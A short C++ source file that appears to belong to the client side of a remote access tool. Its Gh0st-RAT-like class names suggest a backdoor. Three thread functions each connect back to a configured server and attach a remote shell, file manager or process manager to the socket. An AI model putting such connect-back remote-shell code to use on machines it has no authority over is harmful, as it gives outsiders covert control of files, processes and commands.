#include "stdafx.h"
#include "loop.h"

UINT WINAPI Loop_ShellManager(void* ID)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_ServerHost, CKernelManager::m_ServerPort))
		return -1;

	CShellManager	manager(&socketClient,(UINT)ID);

	socketClient.run_event_loop();

	return 0;
}
UINT WINAPI Loop_FileManager(void* ID)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_ServerHost, CKernelManager::m_ServerPort))
		return -1;
	CFileManager	manager(&socketClient,(UINT)ID);
	socketClient.run_event_loop();
	return 0;
}
UINT WINAPI Loop_ProcessManager(void* ID)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_ServerHost, CKernelManager::m_ServerPort))
		return -1;
	CProcessManager	manager(&socketClient,(UINT)ID);
	socketClient.run_event_loop();
	return 0;
}